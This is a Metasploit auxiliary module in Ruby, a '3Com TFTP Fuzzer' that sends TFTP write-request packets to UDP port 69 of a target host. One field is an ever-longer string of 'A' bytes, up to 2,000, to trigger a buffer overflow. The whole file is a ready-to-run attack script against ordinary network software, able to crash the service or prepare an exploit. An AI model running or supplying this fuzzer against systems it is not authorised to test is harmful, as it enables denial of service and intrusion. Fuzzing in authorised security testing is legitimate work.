require 'msf/core'

class Metasploit3 < Msf::Auxiliary
    include Msf::Auxiliary::Scanner

    def initialize
        super(
                'Name'          =>  '3Com TFTP Fuzzer',
                'Version'       =>  '$Revision: 1 $',
                'Description'   =>  '3Com TFTP Fuzzer Long String',
                'Author'        =>  'Constantin Musca',
                'License'       =>  MSF_LICENSE
        )
        register_options(
                [
                    Opt::RPORT(69)
                ], self.class
        )
    end

    def run_host(ip)
        # Create an unbound UDP socket
        udp_sock = Rex::Socket::Udp.create(
                'Context'   =>
                        {
                            'Msf'           => framework,
                            'MsfExploit'    => self,
                        }
        )
        count = 10 # Set an initial count
        while count < 2000
            evil = "A" * count
            pkt = "\x00\x02" + "\x41" + "\x00" + evil + "\x00"
            udp_sock.sendto(pkt, ip, datastore['RPORT'])
            print_status("Sending: #{evil}")
            response = udp_sock.get(1)
            count += 10
        end
    end
end
